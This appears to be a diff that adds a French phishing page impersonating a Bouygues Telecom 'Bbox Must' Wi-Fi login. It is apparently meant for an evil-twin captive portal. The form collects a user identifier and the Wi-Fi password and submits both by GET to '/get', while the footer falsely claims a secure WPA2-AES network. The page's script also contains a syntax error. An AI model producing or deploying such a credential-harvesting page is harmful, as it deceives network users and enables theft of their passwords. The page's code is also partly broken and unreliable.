@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
+<title>Bbox Must — Wi-Fi</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html,body{width:100%;height:100%;overflow:hidden;background:#09030a;}
+canvas{position:fixed;inset:0;z-index:0;}
+.scene{position:fixed;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;padding:16px;}
+.card{
+  position:relative;width:100%;max-width:420px;
+  background:rgba(6,2,2,0.82);
+  backdrop-filter:blur(32px);-webkit-backdrop-filter:blur(32px);
+  border:1px solid rgba(229,0,125,0.2);
+  border-radius:14px;
+  box-shadow:0 20px 60px rgba(0,0,0,0.5);
+  
+  animation:rise .7s cubic-bezier(.16,1,.3,1) both;
+}
+@keyframes rise{from{opacity:0;transform:translateY(24px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}
+.card::before{
+  content:'';position:absolute;top:-1px;left:15%;right:15%;height:1px;
+  background:linear-gradient(90deg,transparent,#e5007d,transparent);
+  animation:topglow 3s ease-in-out infinite alternate;
+}
+@keyframes topglow{from{left:25%;right:25%;opacity:.5}to{left:5%;right:5%;opacity:1}}
+.inner{padding:clamp(24px,5vw,36px) clamp(20px,5vw,34px) clamp(20px,4vw,28px);}
+
+/* LOGO */
+.logo{margin-bottom:22px;opacity:0;animation:up .5s .15s forwards;}
+.logo-badge{
+  display:inline-flex;align-items:baseline;gap:1px;
+  font-family:'Montserrat',sans-serif;
+  font-weight:900;font-size:clamp(1.3rem,4vw,1.7rem);letter-spacing:-.02em;
+}
+.logo-top{color:#e5007d;}
+.logo-bot{color:#ffffff;}
+.logo-sub{
+  font-family:'Fira Mono',monospace;
+  font-size:.55rem;letter-spacing:.14em;text-transform:uppercase;
+  color:rgba(255,255,255,0.55);margin-top:3px;
+}
+.sep{height:1px;background:linear-gradient(90deg,#e5007d44,transparent);margin:14px 0 18px;opacity:0;animation:up .5s .3s forwards;}
+
+/* HEADLINE */
+.headline{
+  font-family:'Montserrat',sans-serif;
+  font-weight:700;font-size:clamp(1.1rem,3.5vw,1.35rem);
+  color:#ffffff;letter-spacing:-.01em;margin-bottom:4px;
+  opacity:0;animation:up .5s .2s forwards;
+}
+.subline{
+  font-family:'Fira Mono',monospace;
+  font-size:clamp(.55rem,.8vw,.65rem);letter-spacing:.08em;
+  color:rgba(255,255,255,0.55);margin-bottom:20px;
+  opacity:0;animation:up .5s .25s forwards;
+}
+
+/* FIELDS */
+.field{margin-bottom:14px;opacity:0;animation:up .5s .45s forwards;}
+.field+.field{animation-delay:.52s;}
+.field-label{
+  font-family:'Fira Mono',monospace;
+  font-size:.57rem;letter-spacing:.18em;text-transform:uppercase;
+  color:rgba(229,0,125,0.5);margin-bottom:7px;
+}
+.input-wrap{position:relative;}
+input[type=text],input[type=password]{
+  width:100%;padding:clamp(10px,2.5vw,13px) 42px clamp(10px,2.5vw,13px) clamp(12px,2.5vw,15px);
+  background:rgba(255,255,255,0.05);border:1.5px solid rgba(255,255,255,0.1);
+  color:#ffffff;
+  font-family:'Fira Mono',monospace;
+  font-size:clamp(.8rem,2.2vw,.92rem);letter-spacing:.04em;
+  border-radius:8px;outline:none;caret-color:#e5007d;
+  transition:border-color .25s,background .25s,box-shadow .25s;
+  -webkit-appearance:none;appearance:none;
+}
+input::placeholder{color:rgba(255,255,255,0.2);}
+input:focus{
+  border-color:#e5007d88;
+  background:rgba(255,255,255,0.07);
+  box-shadow:0 0 0 3px rgba(229,0,125,0.09);
+}
+.eye{
+  position:absolute;right:11px;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;
+  color:rgba(255,255,255,0.3);transition:color .2s;padding:5px;
+}
+.eye:hover{color:#e5007d;}
+.eye svg{display:block;width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:1.6;}
+
+/* REMEMBER */
+.remember{
+  display:flex;align-items:center;gap:9px;margin-bottom:18px;cursor:pointer;
+  opacity:0;animation:up .5s .58s forwards;
+}
+.remember input[type=checkbox]{display:none;}
+.chk{
+  width:18px;height:18px;flex-shrink:0;
+  border:1.5px solid rgba(255,255,255,0.1);
+  border-radius:4px;background:rgba(255,255,255,0.05);
+  display:flex;align-items:center;justify-content:center;
+  transition:border-color .2s,background .2s;
+}
+.remember:has(input:checked) .chk{background:#e5007d;border-color:#e5007d;}
+.chk-ico{opacity:0;transition:opacity .15s;}
+.remember:has(input:checked) .chk-ico{opacity:1;}
+.rem-label{
+  font-family:'Fira Mono',monospace;
+  font-size:clamp(.62rem,.9vw,.72rem);letter-spacing:.04em;color:rgba(255,255,255,0.55);
+  user-select:none;
+}
+
+/* BUTTON */
+.btn-wrap{opacity:0;animation:up .5s .65s forwards;}
+button[type=submit]{
+  width:100%;padding:clamp(12px,3vw,14px);border:none;cursor:pointer;
+  border-radius:8px;
+  font-family:'Montserrat',sans-serif;
+  font-weight:700;font-size:clamp(.75rem,2.2vw,.88rem);letter-spacing:.06em;text-transform:uppercase;
+  color:#fff;
+  background:#e5007d;
+  position:relative;overflow:hidden;
+  transition:filter .2s,box-shadow .3s,transform .15s;
+}
+button[type=submit]:hover{filter:brightness(1.12);box-shadow:0 8px 28px rgba(229,0,125,0.4);transform:translateY(-1px);}
+button[type=submit]:active{transform:translateY(0);}
+button[type=submit]::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.15) 0%,transparent 60%);}
+
+/* FOOTER */
+.footer{
+  display:flex;justify-content:space-between;align-items:center;
+  margin-top:16px;
+  font-family:'Fira Mono',monospace;
+  font-size:clamp(.48rem,.7vw,.55rem);letter-spacing:.1em;text-transform:uppercase;
+  color:rgba(255,255,255,0.2);
+  opacity:0;animation:up .5s .75s forwards;
+}
+.dot{width:4px;height:4px;border-radius:50%;background:#e5007d;box-shadow:0 0 5px #e5007d;animation:blink 2s infinite;display:inline-block;margin-right:5px;vertical-align:middle;}
+@keyframes blink{50%{opacity:0;}}
+@keyframes up{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+</style>
+</head>
+<body>
+<canvas id="cv"></canvas>
+<div class="scene">
+  <div class="card">
+    <div class="inner">
+      <div class="logo">
+        <div class="logo-badge">
+          <span class="logo-top">B</span><span class="logo-bot">box Must</span>
+        </div>
+        <div class="logo-sub">Bouygues Telecom · Fibre Wi-Fi</div>
+      </div>
+      <div class="headline">Connexion au réseau Wi-Fi</div>
+      <p class="subline">Saisissez vos identifiants pour accéder à Internet</p>
+      <div class="sep"></div>
+      <form action="/get"   method="get">
+        <div class="field">
+          <div class="field-label">Identifiant / Nom d'utilisateur</div>
+          <div class="input-wrap">
+            <input type="text" name="email" placeholder="Identifiant" autocomplete="username" required>
+          </div>
+        </div>
+        <div class="field">
+          <div class="field-label">Mot de passe Wi-Fi</div>
+          <div class="input-wrap">
+            <input type="password" id="pw" name="password" placeholder="Mot de passe" autocomplete="current-password" required>
+            <button type="button" class="eye" id="eyebtn" aria-label="Afficher le mot de passe">
+              <svg id="eico" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
+          </div>
+        </div>
+        <label class="remember">
+          <input type="checkbox" name="remember" value="1">
+          <div class="chk"><svg class="chk-ico" viewBox="0 0 12 12" width="10" height="10" fill="none" stroke="#fff" stroke-width="2"><polyline points="2,6 5,9 10,3"/></svg></div>
+          <span class="rem-label">Se souvenir de moi</span>
+        </label>
+        <div class="btn-wrap">
+          <button type="submit">Se connecter</button>
+        </div>
+      </form>
+      <div class="footer">
+        <span><span class="dot"></span>Réseau sécurisé</span>
+        <span>Bbox-Must · WPA2-AES</span>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+const cv=document.getElementById('cv'),X=cv.getContext('2d');
+let W,H,let ST=null,PT=null,t=0;
+function resize(){W=cv.width=innerWidth;H=cv.height=innerHeight;ST=null;PT=null;}
+window.addEventListener('resize',resize);resize();
+function draw(){
+  t+=.006;
+  
+  X.fillStyle='#09030a';X.fillRect(0,0,W,H);
+  const ox=W/2+Math.sin(t*0.4)*W*0.08,oy=H/2+Math.cos(t*0.3)*H*0.06;
+  const og=X.createRadialGradient(ox,oy,0,ox,oy,Math.min(W,H)*0.55);
+  og.addColorStop(0,'rgba(229,0,125,0.25)');og.addColorStop(0.5,'rgba(229,0,125,0.08)');og.addColorStop(1,'transparent');
+  X.fillStyle=og;X.fillRect(0,0,W,H);
+  requestAnimationFrame(draw);
+}
+draw();
+document.getElementById('eyebtn').addEventListener('click',function(){
+  const p=document.getElementById('pw'),v=p.type==='text';
+  p.type=v?'password':'text';
+  document.getElementById('eico').innerHTML=v
+    ?`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`
+    :`<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`;
+});
+// Custom checkbox click
+document.querySelectorAll('.remember').forEach(el=>{
+  el.addEventListener('click',function(e){
+    if(e.target.tagName!=='INPUT'){
+      const cb=this.querySelector('input[type=checkbox]');
+      cb.checked=!cb.checked;
+    }
+  });
+});
+</script>
+</body>
+</html>
